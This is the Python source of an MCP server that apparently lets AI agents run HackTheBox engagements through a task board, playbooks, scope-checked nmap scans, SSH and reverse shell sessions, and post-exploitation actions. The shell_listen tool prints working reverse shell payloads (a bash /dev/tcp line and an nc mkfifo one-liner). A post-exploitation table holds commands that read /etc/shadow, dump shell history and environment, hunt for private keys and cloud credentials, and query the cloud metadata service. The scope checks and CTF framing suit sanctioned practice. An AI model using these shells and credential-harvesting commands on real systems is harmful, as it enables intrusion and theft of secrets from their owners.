#!/usr/bin/env python3
"""Mr. Robot — an MCP server for orchestrated HackTheBox engagements.

v0.1, the "arsenal" layer: the arcade (findings store + task board), the
playbook engine, the Hat registry, the scope guard, and one scope-checked
recon tool. The orchestrator / robot-spawning layer comes later.

See ~/Mr. Robot/adr/ for the design.
"""
from __future__ import annotations

import os
import select as _select
import socket as _socket
import subprocess
import threading
import time
import uuid
import xml.etree.ElementTree as ET
from pathlib import Path

try:
    import paramiko as _paramiko
    _PARAMIKO = True
except ImportError:
    _PARAMIKO = False

from mcp.server.fastmcp import FastMCP

import scope
from arcade import Arcade
from hats import load_hats
from memory import MEMORY
from playbook import Playbook, render

# --- paths --------------------------------------------------------------
HOME = Path(os.environ.get("MR_ROBOT_HOME",
                           Path(__file__).resolve().parent.parent))
ADR_DIR = HOME / "adr"
PLAYBOOK_DIR = Path(os.environ.get("MR_ROBOT_PLAYBOOKS",
                                   Path.home() / "playbooks"))
ENGAGE_DIR = Path(os.environ.get("MR_ROBOT_ENGAGEMENTS",
                                 HOME / "engagements"))
DB_PATH = ENGAGE_DIR / "arcade.db"

# Declared deadline on external subprocess (ADR-0016).
try:
    RECON_DEADLINE = int(os.environ.get(
        "MR_ROBOT_RECON_DEADLINE_SECONDS", "600"))
except ValueError:
    RECON_DEADLINE = 600

try:
    SHELL_READ_IDLE = float(os.environ.get("MR_ROBOT_SHELL_READ_IDLE", "1.0"))
except ValueError:
    SHELL_READ_IDLE = 1.0

_SHELL_SENTINEL = "__MRROBOT_DONE__"
_SHELLS: dict[str, dict] = {}  # session_id -> session state

ENGAGE_DIR.mkdir(parents=True, exist_ok=True)

# --- wiring -------------------------------------------------------------
mcp = FastMCP("mr-robot")
ARC = Arcade(DB_PATH)
HATS = load_hats(ADR_DIR)


def _playbook(name: str) -> Playbook:
    path = PLAYBOOK_DIR / f"{name}.yaml"
    if not path.exists():
        raise ValueError(f"playbook '{name}' not found at {path}")
    return Playbook.load(path)


def _apply_unlock(eng: dict, finding: dict, pb: Playbook) -> tuple[list, list]:
    """Run the playbook against a new finding. Returns (spawned, unlocked)."""
    spawned = []
    for rule_id, tmpl in pb.match(finding):
        task, created = ARC.add_task(
            eng["id"], tmpl.type, render(tmpl.summary, eng, finding),
            priority=tmpl.priority, hat=tmpl.hat,
            depends_on=tmpl.depends_on, produces=tmpl.produces,
            created_by=f"rule:{rule_id}",
        )
        if created:
            spawned.append(task)
    unlocked = ARC.reevaluate_blocked(eng["id"])
    return spawned, unlocked


def _fmt_task(t: dict) -> str:
    return (f"  #{t['id']:>3} [{t['status']:^11}] p{t['priority']:>3} "
            f"{t['summary']}  (hat:{t['hat']})")


# --- tools : engagement -------------------------------------------------
@mcp.tool()
def engagement_start(box_name: str, box_ip: str,
                     playbook: str = "htb-default") -> str:
    """Start an engagement against a box. Creates the arcade workspace, locks
    scope to box_ip, loads the playbook, and seeds the task board."""
    try:
        pb = _playbook(playbook)
        eng = ARC.start_engagement(box_name, box_ip, playbook)
    except Exception as exc:
        return f"X {exc}"
    (ENGAGE_DIR / box_name / "loot").mkdir(parents=True, exist_ok=True)
    seeded = []
    for tmpl in pb.seeds:
        task, created = ARC.add_task(
            eng["id"], tmpl.type, render(tmpl.summary, eng, None),
            priority=tmpl.priority, hat=tmpl.hat,
            depends_on=tmpl.depends_on, produces=tmpl.produces,
            created_by="seed",
        )
        if created:
            seeded.append(task)
    lines = [f">> engagement '{box_name}' started — scope locked to {box_ip}",
             f"   playbook: {pb.name}   workspace: {ENGAGE_DIR / box_name}",
             f"   seeded {len(seeded)} task(s):"]
    lines += [_fmt_task(t) for t in seeded]
    return "\n".join(lines)


@mcp.tool()
def engagement_status(box_name: str = "") -> str:
    """Show an engagement's task board, or list all engagements if box_name
    is omitted."""
    try:
        if not box_name:
            engs = ARC.list_engagements()
            if not engs:
                return "(no engagements yet — call engagement_start)"
            return "\n".join(
                f"- {e['box_name']}  ({e['box_ip']})  status={e['status']}  "
                f"flags[user={'Y' if e['flag_user'] else '-'} "
                f"root={'Y' if e['flag_root'] else '-'}]" for e in engs)
        eng = ARC.require_engagement(box_name)
    except Exception as exc:
        return f"X {exc}"
    findings = ARC.list_findings(eng["id"])
    tasks = ARC.list_tasks(eng["id"])
    lines = [f">> {box_name}  ({eng['box_ip']})  status={eng['status']}",
             f"   flags: user={eng['flag_user'] or '-'}  "
             f"root={eng['flag_root'] or '-'}",
             f"   findings: {len(findings)}   tasks: {len(tasks)}",
             "-- task board --"]
    for status in ("ready", "in_progress", "blocked", "done", "dead_end"):
        for t in [x for x in tasks if x["status"] == status]:
            lines.append(_fmt_task(t))
    return "\n".join(lines)


# --- tools : arcade -----------------------------------------------------
@mcp.tool()
def arcade_post_finding(box_name: str, type: str, data: dict,
                        confidence: str = "confirmed", source_hat: str = "",
                        source_robot: str = "") -> str:
    """Post a finding to the arcade and fire the playbook's unlock rules.
    `type` is one of: port, service, web_path, credential, cve, foothold,
    privesc_vector, flag, edr_verdict. A `flag` finding records the engagement
    flag. An `edr_verdict` finding records the result of a post-exploitation
    action: {action, verdict: permitted|blocked, source, evidence}."""
    try:
        eng = ARC.require_engagement(box_name)
        pb = _playbook(eng["playbook"])
        finding, created = ARC.post_finding(
            eng["id"], type, data, confidence,
            source_hat or None, source_robot or None)
        if not created:
            return f"~ duplicate {type} finding — already on board as #{finding['id']}"
        if type == "flag":
            ARC.set_flag(eng["id"], data.get("which", "user"),
                         str(data.get("value", "captured")))
        spawned, unlocked = _apply_unlock(eng, finding, pb)
        lines = [f"+ finding #{finding['id']} posted: {type} {data}"]
        if spawned:
            lines.append(f"  unlocked {len(spawned)} task(s):")
            lines += [_fmt_task(t) for t in spawned]
        if unlocked:
            lines.append(f"  {len(unlocked)} blocked task(s) became ready:")
            lines += [_fmt_task(t) for t in unlocked]
        if not spawned and not unlocked:
            lines.append("  (no rules matched — no new tasks)")
        return "\n".join(lines)
    except Exception as exc:
        return f"X {exc}"


@mcp.tool()
def arcade_list_tasks(box_name: str, status: str = "") -> str:
    """List tasks on the board, optionally filtered by status
    (ready, in_progress, blocked, done, dead_end)."""
    try:
        eng = ARC.require_engagement(box_name)
        tasks = ARC.list_tasks(eng["id"], status or None)
    except Exception as exc:
        return f"X {exc}"
    if not tasks:
        return f"(no tasks{' with status ' + status if status else ''})"
    out = []
    for t in tasks:
        extra = f"  @{t['claimed_by']}" if t["claimed_by"] else ""
        if t["depends_on"]:
            extra += f"  needs:{t['depends_on']}"
        out.append(_fmt_task(t) + extra)
    return "\n".join(out)


@mcp.tool()
def arcade_claim_task(box_name: str, task_id: int, robot: str) -> str:
    """Claim a ready task for a robot — marks it in_progress."""
    try:
        ARC.require_engagement(box_name)
        t = ARC.claim_task(task_id, robot)
        return f"+ task #{t['id']} claimed by {robot} — {t['summary']}"
    except Exception as exc:
        return f"X {exc}"


@mcp.tool()
def arcade_complete_task(box_name: str, task_id: int,
                         produced: list[int] | None = None) -> str:
    """Mark a task done. `produced` is the list of finding IDs it yielded."""
    try:
        ARC.require_engagement(box_name)
        t = ARC.complete_task(task_id, produced or [])
        return f"+ task #{t['id']} done — {t['summary']}"
    except Exception as exc:
        return f"X {exc}"


@mcp.tool()
def arcade_report_blocker(box_name: str, task_id: int, need: str,
                          resolved_by: dict) -> str:
    """Report a task is blocked. `need` is human text; `resolved_by` is a
    finding predicate, e.g. {"type":"credential","match":{"service":"ssh"}}.
    The task auto-unblocks when a matching finding lands."""
    try:
        ARC.require_engagement(box_name)
        ARC.report_blocker(task_id, need, resolved_by)
        return (f"! task #{task_id} blocked — need: {need}\n"
                f"  unblocks when a finding matches: {resolved_by}")
    except Exception as exc:
        return f"X {exc}"


# --- tools : hats -------------------------------------------------------
@mcp.tool()
def list_hats() -> str:
    """List the Hat personas defined by the ADRs."""
    if not HATS:
        return "(no Hat ADRs found)"
    return "\n".join(
        f"ADR-{h.adr}  {h.key:<14} {h.klass:<16} {h.posture}"
        for h in sorted(HATS.values(), key=lambda x: x.adr))


@mcp.tool()
def get_hat(name: str) -> str:
    """Get the full contract for a Hat (e.g. 'white-hat', 'black-hat')."""
    h = HATS.get(name)
    if not h:
        return f"X unknown hat '{name}' — known: {', '.join(sorted(HATS))}"
    return (f"{h.title}  (ADR-{h.adr}, {h.klass})\n"
            f"  color:         {h.color}\n"
            f"  posture:       {h.posture}\n"
            f"  authorization: {h.authorization}\n"
            f"  status:        {h.status}\n"
            f"  ADR file:      {h.path}")


# --- tools : memory -----------------------------------------------------
@mcp.tool()
def memory_recall_for_task(box_name: str, task_id: int, hat: str,
                           k: int = 5) -> str:
    """Surface past approaches this Hat has tried for similar tasks. Context
    for a robot's planning — not a directive. Returns [] if the memory layer
    is not provisioned (aiana not installed)."""
    try:
        eng = ARC.require_engagement(box_name)
        task = ARC.get_task(task_id)
        if not task or task["engagement_id"] != eng["id"]:
            return f"X no task #{task_id} in engagement '{box_name}'"
    except Exception as exc:
        return f"X {exc}"
    recs = MEMORY.recall_for_task(task, hat, k=k)
    if not recs:
        return ("(no recollections)" if MEMORY.available
                else "(memory layer not provisioned — no recall)")
    return "\n".join(
        f"  [{r.score:.2f}] {r.box_name}  {r.summary}" for r in recs)


@mcp.tool()
def memory_record_task_outcome(box_name: str, task_id: int, hat: str,
                               approach: str, result: str,
                               learned: str = "") -> str:
    """Write a short recollection of this robot's work on this task. Called
    at complete or dead_end. `result` is 'complete' or 'dead_end'. No-op if
    the memory layer is not provisioned."""
    try:
        eng = ARC.require_engagement(box_name)
        task = ARC.get_task(task_id)
        if not task or task["engagement_id"] != eng["id"]:
            return f"X no task #{task_id} in engagement '{box_name}'"
    except Exception as exc:
        return f"X {exc}"
    if result not in ("complete", "dead_end"):
        return f"X result must be 'complete' or 'dead_end', got '{result}'"
    MEMORY.record_task_outcome(
        task, hat,
        {"approach": approach, "result": result, "learned": learned})
    return (f"+ task outcome recorded for #{task_id} ({hat}, {result})"
            if MEMORY.available
            else "~ memory layer not provisioned — outcome dropped")


# --- tools : recon ------------------------------------------------------
def _parse_nmap_xml(xml_text: str) -> list[dict]:
    out: list[dict] = []
    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return out
    for host in root.findall("host"):
        for port in host.findall("./ports/port"):
            state = port.find("state")
            if state is None or state.get("state") != "open":
                continue
            svc = port.find("service")
            out.append({
                "port": int(port.get("portid")),
                "proto": port.get("protocol") or "tcp",
                "service": (svc.get("name") if svc is not None else None)
                or "unknown",
                "product": (svc.get("product") if svc is not None else "")
                or "",
                "version": (svc.get("version") if svc is not None else "")
                or "",
            })
    return out


@mcp.tool()
def recon_portscan(box_name: str, target: str, top_ports: int = 100) -> str:
    """Scope-checked nmap scan. Resolves `target`, refuses anything outside the
    engagement scope, runs a TCP connect + service scan, and posts the open
    ports/services to the arcade — which unlocks further tasks."""
    try:
        eng = ARC.require_engagement(box_name)
    except Exception as exc:
        return f"X {exc}"
    # the ethics axis: scope enforcement happens before nmap ever runs
    try:
        detail = scope.enforce(target, [eng["box_ip"]])
    except scope.ScopeError as exc:
        return (f"[STOP] {exc}\n"
                f"  recon_portscan refused — target is not in engagement scope.")
    cmd = ["nmap", "-Pn", "-sT", "-T4", "--open", "-sV",
           "--top-ports", str(top_ports), "-oX", "-", target]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True,
                              timeout=RECON_DEADLINE)
    except subprocess.TimeoutExpired:
        return f"X nmap timed out after {RECON_DEADLINE}s on {target}"
    except FileNotFoundError:
        return "X nmap not found on PATH"
    if proc.returncode != 0 and not proc.stdout.strip():
        return f"X nmap failed: {proc.stderr.strip()[:300]}"

    ports = _parse_nmap_xml(proc.stdout)
    pb = _playbook(eng["playbook"])
    lines = [f"+ scope check: {detail}",
             f"+ nmap {target} (top {top_ports}) — {len(ports)} open port(s)"]
    spawned: list = []
    for p in ports:
        ARC.post_finding(eng["id"], "port",
                         {"port": p["port"], "proto": p["proto"]},
                         source_hat="script-kiddie", source_robot="recon")
        sdata = {"port": p["port"], "service": p["service"]}
        if p["product"]:
            sdata["product"] = p["product"]
        if p["version"]:
            sdata["version"] = p["version"]
        if p["service"] in ("http", "https", "http-proxy", "http-alt"):
            sproto = "https" if p["service"] == "https" else "http"
            sdata["url"] = f"{sproto}://{target}:{p['port']}/"
        f_svc, created = ARC.post_finding(eng["id"], "service", sdata,
                                          source_hat="script-kiddie",
                                          source_robot="recon")
        lines.append(f"  {p['port']:>5}/{p['proto']:<3} {p['service']:<13}"
                     f"{p['product']} {p['version']}".rstrip())
        if created:
            s, _ = _apply_unlock(eng, f_svc, pb)
            spawned += s
    # close the recon seed task
    for t in ARC.list_tasks(eng["id"]):
        if t["type"] == "recon.portscan" and t["status"] in (
                "ready", "in_progress"):
            ARC.complete_task(t["id"], [])
    if spawned:
        lines.append(f"-- arcade unlocked {len(spawned)} task(s) --")
        lines += [_fmt_task(t) for t in spawned]
    return "\n".join(lines)


# --- tools : shell sessions ------------------------------------------------
_POST_EX_ACTIONS: dict[str, str] = {
    "process_enum":     "ps aux 2>/dev/null",
    "sudo_check":       "sudo -l 2>&1",
    "suid_search":      "find / -perm -4000 -type f 2>/dev/null | head -30",
    "cron_enum":        "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
    "network_enum":     "ip addr 2>/dev/null; ss -tulnp 2>/dev/null",
    "history_dump":     "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50",
    "env_dump":         "env 2>/dev/null",
    "credential_search": (
        "find / -maxdepth 6 \\( -name '*.pem' -o -name '*.key' -o -name 'id_rsa'"
        " -o -name 'credentials' -o -name '.aws' -o -name 'wp-config.php' \\)"
        " -readable 2>/dev/null | head -20"
    ),
    "cloud_metadata": (
        "curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null"
        " || curl -sf --max-time 3 -H 'Metadata: true'"
        " 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
        " 2>/dev/null || echo no_cloud_metadata"
    ),
    "shadow_read":  "cat /etc/shadow 2>&1",
    "passwd_read":  "cat /etc/passwd 2>/dev/null",
}

_EDR_BLOCK_SIGNALS = frozenset([
    "permission denied", "operation not permitted", "access denied",
    "killed", "not allowed", "cannot open",
])


def _auto_verdict(output: str) -> str:
    """Heuristic: short output that is purely an error string → blocked."""
    stripped = (output or "").strip()
    if not stripped or stripped == "no_cloud_metadata":
        return "blocked"
    if len(stripped) < 120 and any(p in stripped.lower()
                                   for p in _EDR_BLOCK_SIGNALS):
        return "blocked"
    return "permitted"


def _shell_sid() -> str:
    return uuid.uuid4().hex[:8]


def _post_foothold(eng: dict, method: str, user: str, source: str,
                   hat: str = "white-hat") -> None:
    ARC.post_finding(
        eng["id"], "foothold",
        {"method": method, "user": user, "source": source},
        source_hat=hat, source_robot="shell",
    )


@mcp.tool()
def shell_listen(box_name: str, lhost: str, lport: int,
                 accept_timeout: int = 120) -> str:
    """Start a reverse shell listener on lhost:lport. Returns a session ID
    immediately; the session goes live when the target connects back.
    Scope-checks the incoming IP on arrival. Posts a foothold finding.

    Typical flow:
      1. Call shell_listen → get session_id.
      2. Trigger the payload on the target (command injection, web shell, etc.):
             bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
      3. Call shell_exec('<session_id>', 'id') — waits for connection, then runs."""
    try:
        eng = ARC.require_engagement(box_name)
    except Exception as exc:
        return f"X {exc}"

    try:
        srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        srv.bind((lhost, lport))
        srv.listen(1)
        srv.settimeout(accept_timeout)
    except OSError as exc:
        return f"X cannot bind {lhost}:{lport} — {exc}"

    event = threading.Event()
    sid = _shell_sid()
    sess: dict = {
        "type": "reverse", "srv": srv, "conn": None,
        "box_name": box_name, "status": "pending",
        "_event": event, "_eng": eng,
    }
    _SHELLS[sid] = sess

    def _accept() -> None:
        try:
            conn, addr = srv.accept()
        except OSError:
            sess["status"] = "closed"
            event.set()
            return
        try:
            scope.enforce(addr[0], [eng["box_ip"]])
        except scope.ScopeError as exc:
            conn.close()
            sess["status"] = "closed"
            sess["_error"] = f"SCOPE VIOLATION — incoming {addr[0]}: {exc}"
            event.set()
            return
        conn.settimeout(None)
        sess["conn"] = conn
        sess["addr"] = addr
        sess["status"] = "live"
        _post_foothold(eng, "reverse_shell", "unknown", addr[0])
        event.set()

    threading.Thread(target=_accept, daemon=True,
                     name=f"shell-accept-{sid}").start()

    return (f"+ reverse shell listener on {lhost}:{lport}  session={sid}\n"
            f"  waiting up to {accept_timeout}s for the target to connect.\n"
            f"  trigger payload, then call: shell_exec('{sid}', 'id')\n"
            f"  bash payload: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
            f"  nc payload:   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1"
            f"|nc {lhost} {lport} >/tmp/f")


@mcp.tool()
def shell_open(box_name: str, target: str, user: str,
               password: str = "", key_file: str = "",
               port: int = 22) -> str:
    """Open an SSH shell to target using discovered credentials. Scope-checked.
    Returns a session ID for use with shell_exec / shell_close.
    Provide either password or key_file (absolute path to a private key)."""
    if not _PARAMIKO:
        return "X paramiko not installed — pip install paramiko"
    try:
        eng = ARC.require_engagement(box_name)
        scope.enforce(target, [eng["box_ip"]])
    except Exception as exc:
        return f"X {exc}"

    if not password and not key_file:
        return "X provide either password or key_file"

    try:
        client = _paramiko.SSHClient()
        client.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
        kw: dict = {"username": user, "port": port, "timeout": 15}
        if key_file:
            kw["key_filename"] = key_file
        else:
            kw["password"] = password
        client.connect(target, **kw)
    except Exception as exc:
        return f"X SSH connect failed: {exc}"

    sid = _shell_sid()
    _SHELLS[sid] = {
        "type": "ssh", "client": client,
        "box_name": box_name, "status": "live", "_eng": eng,
    }
    _post_foothold(eng, "ssh", user, target)
    return (f"+ SSH session {sid} open — {user}@{target}:{port}\n"
            f"  call shell_exec('{sid}', 'id') to verify.")


@mcp.tool()
def shell_exec(session_id: str, command: str, timeout: int = 30) -> str:
    """Execute a command in an open shell session and return the output.
    For a pending reverse session, waits up to `timeout` seconds for the
    connection to arrive before running the command."""
    sess = _SHELLS.get(session_id)
    if not sess:
        return f"X no session '{session_id}' — call shell_listen or shell_open"
    if sess["status"] == "closed":
        return f"X session '{session_id}' is closed"

    if sess["status"] == "pending":
        arrived = sess["_event"].wait(timeout=timeout)
        if not arrived or sess["status"] != "live":
            err = sess.get("_error", "timed out waiting for reverse connection")
            return f"X {err}"

    if sess["type"] == "ssh":
        try:
            _, stdout, stderr = sess["client"].exec_command(command,
                                                            timeout=timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            return (out + err).rstrip() or "(no output)"
        except Exception as exc:
            return f"X ssh exec failed: {exc}"

    # reverse shell — sentinel-terminated read
    conn: _socket.socket = sess["conn"]
    payload = command.rstrip() + f"; echo {_SHELL_SENTINEL}\n"
    try:
        conn.sendall(payload.encode())
    except OSError as exc:
        sess["status"] = "closed"
        return f"X send failed (shell died?): {exc}"

    output = b""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        remaining = max(0.0, deadline - time.monotonic())
        ready, _, _ = _select.select([conn], [], [],
                                     min(remaining, SHELL_READ_IDLE))
        if ready:
            try:
                chunk = conn.recv(4096)
            except OSError as exc:
                sess["status"] = "closed"
                return (output.decode(errors="replace").rstrip()
                        + f"\n(connection lost: {exc})")
            if not chunk:
                sess["status"] = "closed"
                break
            output += chunk
            if _SHELL_SENTINEL.encode() in output:
                break
        elif output:
            # idle gap after data with no sentinel — shell may have eaten echo
            break

    lines = [l for l in output.decode(errors="replace").splitlines()
             if _SHELL_SENTINEL not in l]
    return "\n".join(lines).strip() or "(no output)"


@mcp.tool()
def shell_list_sessions(box_name: str = "") -> str:
    """List active shell sessions, optionally filtered by box_name."""
    items = [
        (sid, s) for sid, s in _SHELLS.items()
        if s.get("status") != "closed"
        and (not box_name or s.get("box_name") == box_name)
    ]
    if not items:
        return f"(no active sessions{' for ' + box_name if box_name else ''})"
    lines = []
    for sid, s in items:
        addr = s.get("addr", ("", ""))
        detail = f"{addr[0]}:{addr[1]}" if s["type"] == "reverse" else ""
        lines.append(f"  {sid}  [{s['status']:^8}]  {s['type']:<8}  "
                     f"box={s['box_name']}  {detail}".rstrip())
    return "\n".join(lines)


@mcp.tool()
def shell_post_ex(box_name: str, action: str, session_id: str = "",
                  timeout: int = 20) -> str:
    """Run a named post-exploitation action on an active shell session and post
    an edr_verdict finding (permitted/blocked) to the arcade.
    Auto-selects the most recent live session for box_name if session_id is
    omitted. Use shell_list_sessions to see available sessions.

    Actions: process_enum, sudo_check, suid_search, cron_enum, network_enum,
             history_dump, env_dump, credential_search, cloud_metadata,
             shadow_read, passwd_read"""
    try:
        eng = ARC.require_engagement(box_name)
    except Exception as exc:
        return f"X {exc}"

    if action not in _POST_EX_ACTIONS:
        return (f"X unknown action '{action}' — "
                f"known: {', '.join(sorted(_POST_EX_ACTIONS))}")

    # resolve session — prefer explicit, fall back to most-recent live
    sid = session_id
    if sid:
        if sid not in _SHELLS:
            return f"X no session '{sid}'"
    else:
        sid = next(
            (s for s, v in reversed(list(_SHELLS.items()))
             if v.get("box_name") == box_name and v.get("status") == "live"),
            None,
        )
        if not sid:
            return (f"X no live session for '{box_name}' — "
                    f"call shell_listen or shell_open first")

    output = shell_exec(sid, _POST_EX_ACTIONS[action], timeout=timeout)
    verdict = _auto_verdict(output)
    evidence = (output or "")[:600].rstrip()

    pb = _playbook(eng["playbook"])
    finding, created = ARC.post_finding(
        eng["id"], "edr_verdict",
        {"action": action, "verdict": verdict,
         "source": eng["box_ip"], "evidence": evidence},
        source_hat="purple-hat", source_robot="post-ex",
    )
    spawned, unlocked = _apply_unlock(eng, finding, pb) if created else ([], [])

    tag = "+" if created else "~"
    lines = [f"{tag} post_ex.{action} → {verdict.upper()}  (finding #{finding['id']})",
             f"  evidence: {evidence[:200]}"]
    if spawned:
        lines.append(f"  unlocked {len(spawned)} task(s):")
        lines += [_fmt_task(t) for t in spawned]
    return "\n".join(lines)


@mcp.tool()
def shell_close(session_id: str) -> str:
    """Close a shell session and free its resources."""
    sess = _SHELLS.pop(session_id, None)
    if not sess:
        return f"X no session '{session_id}'"
    try:
        if sess["type"] == "reverse":
            if sess.get("conn"):
                sess["conn"].close()
            if sess.get("srv"):
                sess["srv"].close()
        elif sess["type"] == "ssh":
            sess["client"].close()
    except Exception:
        pass
    return f"+ session '{session_id}' closed"


if __name__ == "__main__":
    mcp.run()
